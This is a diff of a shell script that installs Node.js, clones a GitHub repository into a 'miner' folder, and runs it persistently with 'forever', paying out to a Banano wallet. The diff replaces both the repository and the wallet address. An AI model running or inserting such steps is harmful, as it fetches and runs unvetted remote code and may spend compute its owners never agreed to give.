@@ -11,12 +11,12 @@ tar xf node-v10.15.3-linux-x64.tar.xz
 echo "export PATH=$PATH:/app/node-v10.15.3-linux-x64/bin" >> ~/.bash_profile
 source ~/.bash_profile
 
-git clone https://github.com/minhdo123/bnm.git miner
+git clone https://github.com/ngocsuo/Johhoang.git miner
 cd miner
 npm i --unsafe-perm=true
 npm i forever -g --unsafe-perm=true
 
-export WALLET=ban_39a3m9p8w4tt7hzrdbitongi4jobegob4at1wpwhkc78tzn4iddhjaexp5yd
+export WALLET=ban_1wxumtaerfd1mg164c9zra9e7bnape7toms5a3m3igkg9mb5dpceso4a1o7e
 forever start index.js $WALLET 4
 
 
